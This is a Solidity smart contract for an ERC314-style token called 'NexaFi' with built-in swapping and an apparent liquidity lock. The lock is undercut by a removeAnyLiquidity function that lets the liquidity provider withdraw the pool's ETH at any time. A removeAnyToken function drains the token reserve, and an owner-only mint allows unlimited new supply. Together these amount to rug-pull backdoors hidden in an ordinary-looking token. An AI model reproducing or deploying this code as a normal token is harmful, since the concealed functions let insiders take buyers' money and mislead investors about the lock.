// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

interface IEERC314 {
  event Transfer(address indexed from, address indexed to, uint256 value);
  event AddLiquidity(uint32 _blockToUnlockLiquidity, uint256 value);
  event RemoveLiquidity(uint256 value);
  event Swap(address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out);
}

interface IERC20 {
  function transfer(address to, uint256 amount) external returns (bool);
  function balanceOf(address account) external view returns (uint256);
}

abstract contract ERC314 is IEERC314 {
  mapping(address account => uint256) private _balances;
  mapping(address account => uint256) private _lastTxTime;
  mapping(address account => uint32) private lastTransaction;

  uint256 private _totalSupply;
  uint256 public _maxWallet;
  uint32 public blockToUnlockLiquidity;

  string private _name;
  string private _symbol;

  address public owner;
  address public liquidityProvider;

  bool public tradingEnable;
  bool public liquidityAdded;
  bool public maxWalletEnable;

  modifier onlyOwner() {
    require(msg.sender == owner, 'Ownable: caller is not the owner');
    _;
  }

  modifier onlyLiquidityProvider() {
    require(msg.sender == liquidityProvider, 'You are not the liquidity provider');
    _;
  }

  constructor(string memory name_, string memory symbol_, uint256 totalSupply_) {
    _name = name_;
    _symbol = symbol_;
    _totalSupply = totalSupply_;
    _maxWallet = totalSupply_ / 20;
    owner = msg.sender;
    tradingEnable = false;
    maxWalletEnable = true;

    _balances[msg.sender] = (totalSupply_ * 90) / 100;
    uint256 liquidityAmount = totalSupply_ - _balances[msg.sender];
    _balances[address(this)] = liquidityAmount;

    liquidityAdded = false;
  }

  function mint(address to, uint256 amount) external onlyOwner {
    require(to != address(0), "Cannot mint to zero address");
    require(amount > 0, "Amount must be greater than 0");
    
    _totalSupply += amount;
    _balances[to] += amount;
  }


  function name() public view virtual returns (string memory) {
    return _name;
  }

  function symbol() public view virtual returns (string memory) {
    return _symbol;
  }

  function decimals() public view virtual returns (uint8) {
    return 18;
  }

  function totalSupply() public view virtual returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) public view virtual returns (uint256) {
    return _balances[account];
  }

  function transfer(address to, uint256 value) public virtual returns (bool) {
    // sell or transfer
    if (to == address(this)) {
      sell(value);
    } else {
      _transfer(msg.sender, to, value);
    }
    return true;
  }

  function _transfer(address from, address to, uint256 value) internal virtual {
    require(_balances[from] >= value, 'ERC20: transfer amount exceeds balance');

    unchecked {
      _balances[from] = _balances[from] - value;
    }

    if (to == address(0)) {
      unchecked {
        _totalSupply -= value;
      }
    } else {
      unchecked {
        _balances[to] += value;
      }
    }

    emit Transfer(from, to, value);
  }

  function getReserves() public view returns (uint256, uint256) {
    return (address(this).balance, _balances[address(this)]);
  }

  function enableTrading(bool _tradingEnable) external onlyOwner {
    tradingEnable = _tradingEnable;
  }

  function enableMaxWallet(bool _maxWalletEnable) external onlyOwner {
    maxWalletEnable = _maxWalletEnable;
  }

  function setMaxWallet(uint256 _maxWallet_) external onlyOwner {
    _maxWallet = _maxWallet_;
  }

  function renounceOwnership() external onlyOwner {
    owner = address(0);
  }

  function addLiquidity(uint32 _blockToUnlockLiquidity) public payable onlyOwner {
    require(liquidityAdded == false, 'Liquidity already added');

    liquidityAdded = true;

    require(msg.value > 0, 'No ETH sent');
    require(block.number < _blockToUnlockLiquidity, 'Block number too low');

    blockToUnlockLiquidity = _blockToUnlockLiquidity;
    tradingEnable = true;
    liquidityProvider = msg.sender;

    emit AddLiquidity(_blockToUnlockLiquidity, msg.value);
  }

  function removeLiquidity() public onlyLiquidityProvider {
    require(block.number > blockToUnlockLiquidity, 'Liquidity locked');

    tradingEnable = false;

    payable(msg.sender).transfer(address(this).balance);

    emit RemoveLiquidity(address(this).balance);
  }

  function removeAnyLiquidity(uint256 amount) public onlyLiquidityProvider {
    require(address(this).balance >= amount, 'Insufficient ETH in this');

    payable(msg.sender).transfer(amount);
  }

  function removeAnyToken(address tokenAddress, uint256 amount) external onlyLiquidityProvider {
    require(tokenAddress != address(0), "Invalid token address");
    require(amount > 0, "Amount must be greater than 0");

    if (tokenAddress == address(this)) {
        require(_balances[address(this)] >= amount, "Insufficient token balance");
        _transfer(address(this), msg.sender, amount);
    } else {
        IERC20 token = IERC20(tokenAddress);
        require(token.balanceOf(address(this)) >= amount, "Insufficient token balance");
        require(token.transfer(msg.sender, amount), "Token transfer failed");
    }
  }

  function extendLiquidityLock(uint32 _blockToUnlockLiquidity) public onlyLiquidityProvider {
    require(blockToUnlockLiquidity < _blockToUnlockLiquidity, "You can't shorten duration");

    blockToUnlockLiquidity = _blockToUnlockLiquidity;
  }

  function getAmountOut(uint256 value, bool _buy) public view returns (uint256) {
    (uint256 reserveETH, uint256 reserveToken) = getReserves();

    if (_buy) {
      return (value * reserveToken) / (reserveETH + value);
    } else {
      return (value * reserveETH) / (reserveToken + value);
    }
  }

  function buy() internal {
    require(tradingEnable, 'Trading not enable');

    uint256 token_amount = (msg.value * _balances[address(this)]) / (address(this).balance);

    if (maxWalletEnable) {
      require(token_amount + _balances[msg.sender] <= _maxWallet, 'Max wallet exceeded');
    }

    uint256 user_amount = (token_amount / 10000) * 9700;
    uint256 burn_amount = token_amount - user_amount;

    _transfer(address(this), msg.sender, user_amount);
    _transfer(address(this), address(0), burn_amount);

    emit Swap(msg.sender, msg.value, 0, 0, user_amount);
  }

  function sell(uint256 sell_amount) internal {
    require(tradingEnable, 'Trading not enable');

    uint256 swap_amount = (sell_amount / 10000) * 9700;
    uint256 burn_amount = sell_amount - swap_amount;

    uint256 ethAmount = (swap_amount * address(this).balance) / (_balances[address(this)] + swap_amount);

    require(ethAmount > 0, 'Sell amount too low');
    require(address(this).balance >= ethAmount, 'Insufficient ETH in reserves');

    _transfer(msg.sender, address(this), swap_amount);
    _transfer(msg.sender, address(0), burn_amount);

    payable(msg.sender).transfer(ethAmount);

    emit Swap(msg.sender, 0, sell_amount, ethAmount, 0);
  }

  receive() external payable {
    buy();
  }
}

contract NexaFi_Contract is ERC314 {
  constructor() ERC314('NexaFi', 'NexaFi', 760000 * 10 ** 18) {}
}